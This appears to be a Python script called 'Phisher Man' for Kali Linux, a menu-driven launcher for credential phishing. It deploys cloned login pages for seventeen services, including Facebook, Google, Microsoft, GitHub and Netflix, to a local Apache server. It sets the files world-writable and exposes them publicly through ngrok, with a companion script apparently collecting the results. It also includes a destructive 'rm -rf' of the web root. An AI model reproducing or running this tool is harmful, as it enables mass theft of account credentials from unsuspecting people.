#!/usr/bin/python

import os
import time
import sys
os.system("resize -s 90 150")
os.system("clear")  
print ('\x1b[0;36;40m' + '''

 _______         _________ _______         _______ _______    _______ _______ _         
(  ____ )\     /|\__   __/(  ____ \\     /|  ____ \  ____ )  (       )  ___  ) (    /|  
| (    )| )   ( |   ) (   | (    \/ )   ( | (    \/ (    )|  | () () | (   ) |  \  ( |  
| (____)| (___) |   | |   | (_____| (___) | (__   | (____)|  | || || | (___) |   \ | |  
|  _____)  ___  |   | |   (_____  )  ___  |  __)  |     __)  | |(_)| |  ___  | (\ \) |  
| (     | (   ) |   | |         ) | (   ) | (     | (\ (     | |   | | (   ) | | \   |  
| )     | )   ( |___) (___/\____) | )   ( | (____/\ ) \ \__  | )   ( | )   ( | )  \  |  
|/      |/     \|\_______/\_______)/     \|_______//   \__/  |/     \|/     \|/    )_)  

This is a gift from mr.FD
''''\x1b[0m')
input = raw_input

yn = input ('\x1b[1;31;40m' +'do you want to Start (N)o To stop  , or (Y)es To start our project : ''\x1b[0m')
os.system("clear")
if yn =="Y" or yn=="y":
   print ('\x1b[1;37;40m' +'''
                                                                                                      
MMMMMMMM               MMMMMMMM                            FFFFFFFFFFFFFFFFFFFFFFDDDDDDDDDDDDD        
M:::::::M             M:::::::M                            F::::::::::::::::::::FD::::::::::::DDD     
M::::::::M           M::::::::M                            F::::::::::::::::::::FD:::::::::::::::DD   
M:::::::::M         M:::::::::M                            FF::::::FFFFFFFFF::::FDDD:::::DDDDD:::::D  
M::::::::::M       M::::::::::Mrrrrr   rrrrrrrrr             F:::::F       FFFFFF  D:::::D    D:::::D 
M:::::::::::M     M:::::::::::Mr::::rrr:::::::::r            F:::::F               D:::::D     D:::::D
M:::::::M::::M   M::::M:::::::Mr:::::::::::::::::r           F::::::FFFFFFFFFF     D:::::D     D:::::D
M::::::M M::::M M::::M M::::::Mrr::::::rrrrr::::::r          F:::::::::::::::F     D:::::D     D:::::D
M::::::M  M::::M::::M  M::::::M r:::::r     r:::::r          F:::::::::::::::F     D:::::D     D:::::D
M::::::M   M:::::::M   M::::::M r:::::r     rrrrrrr          F::::::FFFFFFFFFF     D:::::D     D:::::D
M::::::M    M:::::M    M::::::M r:::::r                      F:::::F               D:::::D     D:::::D
M::::::M     MMMMM     M::::::M r:::::r                      F:::::F               D:::::D    D:::::D 
M::::::M               M::::::M r:::::r                    FF:::::::FF           DDD:::::DDDDD:::::D  
M::::::M               M::::::M r:::::r             ...... F::::::::FF           D:::::::::::::::DD   
M::::::M               M::::::M r:::::r             .::::. F::::::::FF           D::::::::::::DDD     
MMMMMMMM               MMMMMMMM rrrrrrr             ...... FFFFFFFFFFF           DDDDDDDDDDDDD    

now our project started 
This tool is made for kali linux 
===================================  
            
            ''''\x1b[0m')
   print ('\x1b[1;32;40m' +'press (0) to clean apache''\x1b[0m')
   print ('\x1b[1;32;40m' +"press (1) to Run our Project"'\x1b[0m')
   print ('\x1b[6;31;40m' +"Any key to Exit "'\x1b[0m')

     
else:
#bashi start
   os.system("clear")
   print ("Bye Bye have a good night ;") 
   os.system("sudo service apache2 stop") #stp-apch
   sys.exit()

st = raw_input ('\x1b[1;32;42m' +'Enter your decision .... : ''\x1b[0m')

if st =="1":
   os.system("clear")
   os.system("sudo service apache2 start")
   os.system("chmod 777 ngrok")
elif st =="0":#clean
    os.system("sudo rm -rf /var/www/html/*")
    os.system("clear")
    print "Now apache is clean 3:)"
    sys.exit()  
   
else:
     print ("Bye honey ;) ")
     os.system("sudo service apache2 stop")
     sys.exit()
   #options

print ('\x1b[1;32;40m' +'press (1) to use  Facebook phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (2) to use  github phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (3) to use  gitlab phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (4) to use  google phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (5) to use  Instafollowers phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (6) to use  InstaGram phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (7) to use  linkedin phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (8) to use  microsoft phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (9) to use  netflix phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (10) to use  orgin phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (11) to use  protonmail phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (12) to use  snapchat phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (13) to use  spotify phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (14) to use  steam phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (15) to use  twitter phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (16) to use  wordpress phishing''\x1b[0m')
print ('\x1b[1;32;40m' +'press (17) to use  yahoo phishing''\x1b[0m')
stphish = input ("wich type of phishing do you want to use ? : ")

if stphish =="1":
    os.system("cp -a sites/facebook/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="2":
    os.system("cp -a sites/github/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="3":
    os.system("cp -a sites/gitlab/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="4":
    os.system("cp -a sites/google/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="5":
    os.system("cp -a sites/instafollowers/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="6":
    os.system("cp -a sites/instagram/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="7":
    os.system("cp -a sites/linkedin/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="8":
    os.system("cp -a sites/microsoft/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="9":
    os.system("cp -a sites/netflix/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="10":
    os.system("cp -a sites/origin/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="11":
    os.system("cp -a sites/protonmail/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="12":
    os.system("cp -a sites/snapchat/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="13":
    os.system("cp -a sites/spotify/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="14":
    os.system("cp -a sites/steam/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="16":
    os.system("cp -a sites/wordpress/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="17":
    os.system("cp -a sites/yahoo/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
elif stphish =="15":
    os.system("cp -a sites/twitter/. /var/www/html/ ")
    os.system("chmod 777 /var/www/html/")
    os.system("chmod 777 /var/www/html/*")
    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
else:
    print ("Bye bye phisher man is closed  -_-")
